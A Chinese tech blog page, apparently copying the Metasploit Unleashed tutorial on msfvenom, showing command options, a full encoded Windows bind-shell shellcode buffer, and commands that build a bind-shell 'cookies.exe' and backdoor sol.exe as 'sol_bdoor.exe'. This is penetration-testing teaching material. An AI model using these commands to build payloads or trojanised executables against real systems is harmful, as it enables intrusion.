@@ -1,0 +1,831 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+
+    <title>MSFvenom | 个人博客网站--记录生活所得</title>
+    <meta name="author" content="ζั͡ޓ̯̯̯͡͡طىއއއ๓冰">
+    
+    <meta name="description" content="Using the MSFvenom Command Line Interfacemsfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework in">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="MSFvenom"/>
+    <meta property="og:site_name" content="ζั͡ޓ̯̯̯͡͡طىއއއ๓冰"/>
+
+    
+    <meta property="og:image" content="undefined"/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="ζั͡ޓ̯̯̯͡͡طىއއއ๓冰" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/prettify-tomorrow-night-eighties.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+
+
+<body>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">ζั͡ޓ̯̯̯͡͡طىއއއ๓冰</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            关于
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://ww2.sinaimg.cn/small/74990035jw1f1rjkd681bj20rs0rsdhg.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">ζั͡ޓ̯̯̯͡͡طىއއއ๓冰</p>
+                        <p class="desc">Web前端/技术宅</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    关于
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/freebuf/">
+                    freebuf <span class="right">5 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/便宜vps/">
+                    便宜vps <span class="right">6 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/随笔记录/">
+                    随笔记录 <span class="right">12 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/centos/">
+                    centos <span class="right">7 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/记录/">
+                    记录 <span class="right">26 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/ubuntu/">
+                    ubuntu <span class="right">2 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/debian/">
+                    debian <span class="right">1 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/数据库应用/">
+                    数据库应用 <span class="right">3 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/metasploit/">
+                    metasploit <span class="right">5 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/apache/">
+                    apache <span class="right">1 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/kali-linux/">
+                    kali-linux <span class="right">2 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/隧道技术/">
+                    隧道技术 <span class="right">1 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/linux-mint/">
+                    linux-mint <span class="right">4 篇</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/记录/">记录</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>MSFvenom</h1>
+    
+
+
+            </div>
+            <time class="indigo-link-context" datetime="2015-12-22T09:42:02.000Z"><a href="/2015-12-22-msfvenom.html">2015-12-22</a></time>
+
+            
+
+            <div class="toc indigo-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Using-the-MSFvenom-Command-Line-Interface"><span class="section table-of-contents-text">Using the MSFvenom Command Line Interface</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#MSFvenom-command-line-usage"><span class="section table-of-contents-text">MSFvenom command line usage</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#MSFvenom-options-and-uses"><span class="section table-of-contents-text">MSFvenom options and uses</span></a></li></ol></li></ol>
+</div>
+
+
+            <div class="entry indigo-link-context">
+                <p><a href="http://7xn6ev.com1.z0.glb.clouddn.com//wp-content/uploads/2015/12/201512220940305.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/12/201512220940305-300x203.png" alt="msfvenom-msfencode"></a></p>
+<h2 id="Using-the-MSFvenom-Command-Line-Interface"><a href="#Using-the-MSFvenom-Command-Line-Interface" class="headerlink" title="Using the MSFvenom Command Line Interface"></a>Using the MSFvenom Command Line Interface</h2><p><strong>msfvenom</strong> is a combination of <em>Msfpayload and Msfencode</em>, putting both of these tools into a single Framework instance. Note: <a href="https://community.rapid7.com/community/metasploit/blog/2014/12/08/good-bye-msfpayload-and-msfencode" title="Metasploit Unleashed | Exploit Development : MSFVenom" target="_blank" rel="external"><em><strong>msfvenom</strong></em> has replaced both msfpayload and msfencode as of June 8th, 2015.</a></p>
+<p>The advantages of msfvenom are:</p>
+<ul>
+<li>One single tool</li>
+<li>Standardized command line options</li>
+<li>Increased speed<br>Msfvenom has a wide range of options available:<br><pre id="pre-msfu">root@kali:~# msfvenom -h<br>MsfVenom - a Metasploit standalone payload generator.<br>Also a replacement for msfpayload and msfencode.<br>Usage: /opt/metasploit/apps/pro/msf3/msfvenom [options] &lt;var=val&gt;<br>Options:<br>-p, –payload &lt;payload&gt; Payload to use. Specify a ‘-‘ or stdin to use custom payloads<br> –payload-options List the payload’s standard options<br>-l, –list [type] List a module type. Options are: payloads, encoders, nops, all<br>-n, –nopsled &lt;length&gt; Prepend a nopsled of [length] size on to the payload<br>-f, –format &lt;format&gt; Output format (use –help-formats for a list)<br> –help-formats List available formats<br>-e, –encoder &lt;encoder&gt; The encoder to use<br>-a, –arch &lt;arch&gt; The architecture to use<br> –platform &lt;platform&gt; The platform of the payload<br>-s, –space &lt;length&gt; The maximum size of the resulting payload<br> –encoder-space &lt;length&gt; The maximum size of the encoded payload (defaults to the -s value)<br>-b, –bad-chars &lt;list&gt; The list of characters to avoid example: ‘x00xff’<br>-i, –iterations &lt;count&gt; The number of times to encode the payload<br>-c, –add-code &lt;path&gt; Specify an additional win32 shellcode file to include<br>-x, –template &lt;path&gt; Specify a custom executable file to use as a template<br>-k, –keep Preserve the template behavior and inject the payload as a new thread<br>-o, –out &lt;path&gt; Save the payload<br>-v, –var-name &lt;name&gt; Specify a custom variable name to use for certain output formats<br> –smallest Generate the smallest possible payload<br>-h, –help Show this message</pre></li>
+</ul>
+<p></p>
+<h3 id="MSFvenom-command-line-usage"><a href="#MSFvenom-command-line-usage" class="headerlink" title="MSFvenom command line usage"></a>MSFvenom command line usage</h3><p>We can see an example of the msfvenom command line below and its output:</p>
+<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -i 3 -f python
+Found 1 compatible encoders
+Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 326 (iteration=0)
+x86/shikata_ga_nai succeeded with size 353 (iteration=1)
+x86/shikata_ga_nai succeeded with size 380 (iteration=2)
+x86/shikata_ga_nai chosen with final size 380
+Payload size: 380 bytes
+buf = ""
+buf += "xbbx78xd0x11xe9xdaxd8xd9x74x24xf4x58x31"
+buf += "xc9xb1x59x31x58x13x83xc0x04x03x58x77x32"
+buf += "xe4x53x15x11xeaxffxc0x91x2cx8bxd6xe9x94"
+buf += "x47xdfxa3x79x2bx1cxc7x4cx78xb2xcbxfdx6e"
+buf += "xc2x9dx53x59xa6x37xc3x57x11xc8x77x77x9e"
+buf += "x6dxfcx58xbax82xf9xc0x9ax35x72x7dx01x9b"
+buf += "xe7x31x16x82xf6xe2x89x89x75x67xf7xaaxae"
+buf += "x73x88x3fxf5x6dx3dx9exabx06xdaxffx42x7a"
+buf += "x63x6bx72x59xf6x58xa5xfex3fx0bx41xa0xf2"
+buf += "xfex2dxc9x32x3dxd4x51xf7xa7x56xf8x69x08"
+buf += "x4dx27x8ax2ex19x99x7cxfcx63xfax5cxd5xa8"
+buf += "x1fxa8x9bx88xbbxa5x3cx8fx7fx38x45xd1x71"
+buf += "x34x59x84xb0x97xa0x99xccxfex7fx37xe2x28"
+buf += "xeax57x01xcfxf8x1ex1exd8xd3x05x67x73xf9"
+buf += "x32xbbx76x8cx7cx2fxf6x29x0fxa5x36x2ex73"
+buf += "xdex31xc3xfexaex49x64xd2x39xf1xf2xc7xa0"
+buf += "x06xd3xf6x1axfex0axfex28xbex1ax42x9cxde"
+buf += "x01x16x27xbdx29x1cxf8x7dx47x2cx68x06x0e"
+buf += "x23x31xfex7dx58xe8x7bx76x4bxfexdbx17x51"
+buf += "xfaxdfxffxa1xbcxc5x66x4bxeax23x86x47xb4"
+buf += "xe7xd5x71x77x2ex24x4ax3dxb1x6fx12xf2xb2"
+buf += "xd0x55xc9x23x2exc2xa5x73xb2xc8xb7x7dx6b"
+buf += "x55x29xbcx26xddxf6xe3xf6x25xc6x5cxadx9c"
+buf += "x9dx18x08x3bxbfxd2xffx92x18x5fx48x9bxe0"
+buf += "x7bx03xa5x32x11x27x2bx25xcdx44xdbxbdxb9"
+buf += "xcdx48xdax56x4cx56xd5x04x87x48x3ax6bx9c"
+buf += "x2ax15x4dxbcx0bx56x06xb5xc9x46xd0xfax68"
+buf += "xa6x76xe9x52x2cx24x62x28xe1x1dx87xb0x66"
+buf += "x93x85x8fx87x0fxcfx16x29x76x03x55x0cx0e"
+buf += "x3fx17xac"</pre>
+The msfvenom command and resulting shellcode above generates a _Windows bind shell_ with three iterations of the_shikata_ga_nai encoder_ without any null bytes and in the python format.
+
+### MSFvenom Platforms
+
+Here is a list of available platforms one can enter when using the –platform switch.
+<pre id="pre-msfu">Cisco or cisco
+OSX or osx
+Solaris or solaris
+BSD or bsd
+OpenBSD or openbsd
+Firefox or firefox
+BSDi or bsdi
+NetBSD or netbsd
+NodeJS or nodejs
+FreeBSD or freebsd
+Python or python
+AIX or aix
+JavaScript or javascript
+HPUX or hpux
+PHP or php
+Irix or irix
+Unix or unix
+Linux or linux
+Ruby or ruby
+Java or java
+Android or android
+Netware or netware
+Windows or windows
+</pre>
+
+<h3 id="MSFvenom-options-and-uses"><a href="#MSFvenom-options-and-uses" class="headerlink" title="MSFvenom options and uses"></a>MSFvenom options and uses</h3><p><strong>msfvenom -v or –var-name</strong></p>
+<p>Usage: -v, –var-name &lt;name&gt;</p>
+<p>Specify a custom variable name to use for certain output formats. Assigning a name will change the output’s variable from the default “buf” to whatever word you supplied.</p>
+<p>Default output example:</p>
+<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 326 (iteration=0)
+x86/shikata_ga_nai chosen with final size 326
+Payload size: 326 bytes
+buf = ""
+buf += "xdaxdcxd9x74x24xf4x5bxbaxc5x5exc1x6ax29"
+&lt;snip&gt;</pre>
+Using –var-name output example:
+<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python -v notBuf
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 326 (iteration=0)
+x86/shikata_ga_nai chosen with final size 326
+Payload size: 326 bytes
+notBuf = ""
+notBuf += "xdaxd1xd9x74x24xf4xbfxf0x1fxb8x27x5a"
+&lt;snip&gt;
+</pre>
+**msfvenom –help-format**
+Issuing the msfvenom command with this switch will output all available payload formats.
+<pre id="pre-msfu">root@kali:~# msfvenom --help-formats 
+Executable formats
+asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small,
+hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection,
+psh-cmd, vba, vba-exe, vba-psh, vbs, war
+Transform formats 
+bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, 
+powershell, ps1, py, python, raw, rb, ruby, sh,
+vbapplication, vbscript</pre>
+**msfvenom -n, –nopsled**
+Sometimes you need to add a few NOPs at the start of your payload. This will place a nopsled of [length] size at the beginning of your payload.
+
+BEFORE:
+<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of generic/none
+generic/none succeeded with size 299 (iteration=0)
+generic/none chosen with final size 299
+Payload size: 299 bytes
+buf = ""
+buf += "xfcxe8x82x00x00x00x60x89xe5x31xc0x64x8b" **First line of payload
+buf += "x50x30x8bx52x0cx8bx52x14x8bx72x28x0fxb7"
+&lt;snip&gt;</pre>
+AFTER:
+<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python -n 26
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of generic/none
+generic/none succeeded with size 299 (iteration=0)
+generic/none chosen with final size 299
+Successfully added NOP sled from x86/single_byte
+Payload size: 325 bytes
+buf = ""
+buf += "x98xfdx40xf9x43x49x40x4ax98x49xfdx37x43" **NOPs
+buf += "x42xf5x92x42x42x98xf8xd6x93xf5x92x3fx98"
+buf += "xfcxe8x82x00x00x00x60x89xe5x31xc0x64x8b" **First line of payload
+&lt;snip&gt;</pre>
+**msfvenom –smallest**
+If the “smallest” switch is used, msfvevom will attempt to create the smallest shellcode possible using the
+selected encoder and payload.
+<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 326 (iteration=0)
+x86/shikata_ga_nai chosen with final size 326
+Payload size: 326 bytes
+&lt;snip&gt;
+
+root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python --smallest
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 312 (iteration=0)
+x86/shikata_ga_nai chosen with final size 312
+Payload size: 312 bytes
+&lt;snip&gt;</pre>
+**msfvenom -c, –add-code**
+Specify an additional win32 shellcode file to include, essentially creating a two (2) or more payloads in one (1) shellcode.
+
+Payload #1:
+<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw &gt; messageBox
+No encoder or badchars specified, outputting raw payload
+Payload size: 267 bytes
+</pre>
+Adding payload #2:
+<pre id="pre-msfu">root@kali:~# msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox TEXT="We are evil" -f raw &gt; messageBox2
+Adding shellcode from messageBox to the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 850 bytes</pre>
+Adding payload #3:
+<pre id="pre-msfu">root@kali:~# msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
+Adding shellcode from messageBox2 to the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 1469 bytes
+Saved as: cookies.exe</pre>
+Running the “cookies.exe” file will execute both message box payloads, as well as the bindshell using default settings (port 4444).
+
+[![msfvenom_c_2](https://www.offensive-security.com/wp-content/uploads/2015/05/msfvenom_c_2-300x188.png)](https://www.offensive-security.com/wp-content/uploads/2015/05/msfvenom_c_2.png)
+
+&nbsp;
+
+**msfvenom -x, –template &amp; -k, –keep**
+The -x, or –template, option is used to specify an existing executable to use as a template when creating your executable payload.
+Using the -k, or –keep, option in conjunction will preserve the template’s normal behaviour and have your injected payload run as a separate thread.
+<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "x00" -f exe -o sol_bdoor.exe
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 299 (iteration=0)
+x86/shikata_ga_nai chosen with final size 299
+Payload size: 299 bytes
+Saved as: sol_bdoor.exe</pre>
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+    <section id="comment">
+        <div class="card">
+            <div class="card-content">
+                <!-- Duoshuo Comment BEGIN -->
+                <div class="ds-thread" data-thread-key="2015-12-22-msfvenom.html" data-title="MSFvenom" data-url="http://www.linux52.com/2015-12-22-msfvenom.html"></div>
+
+                <script type="text/javascript">
+                    console.log(document.querySelector('.ds-thread'));
+                    var duoshuoQuery = {
+                        short_name: 'hacksw'
+                    };
+                    (function() {
+                        var ds = document.createElement('script');
+                        ds.type = 'text/javascript';
+                        ds.async = true;
+                        ds.src = (document.location.protocol == 'https:'
+                            ? 'https:'
+                            : 'http:') + '//static.duoshuo.com/embed.js';
+                        ds.charset = 'UTF-8';
+                        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
+                    })();
+                </script>
+                <!-- Duoshuo Comment END -->
+            </div>
+        </div>
+    </section>
+
+
+
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large green">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect blue" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse orange"  data-activates="main-menu" title="menu"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer indigo darken-1">
+    
+    <div class="container">
+        <div class="row">
+            
+            <div class="social-group col m3 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="http://weibo.com/" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="https://github.com/" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+            </div>
+            
+
+            
+            <div class="col m9 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http:www.linux52.com" target="_blank">主题</a>
+                
+                    <a class="social-link" href="https://github.com/" target="_blank">github</a>
+                
+                    <a class="social-link" href="http://www.5cc.xyz" target="_blank">老博客</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright indigo-link-context">
+        <div class="container">
+            © 2016 www.linux52.com, All rights reserved.
+            <p class="right" style="margin-top: 0;">本博客由 <a href="http://www.linux52.com">home</a> 强力驱动 | 主题 <a href="https://github.com/">TEST</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('green lighten-2');
+
+            
+            // 添加new标签
+            $('.menu-reading, .menu-about').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword indigo lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword indigo lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+</body>
+</html>
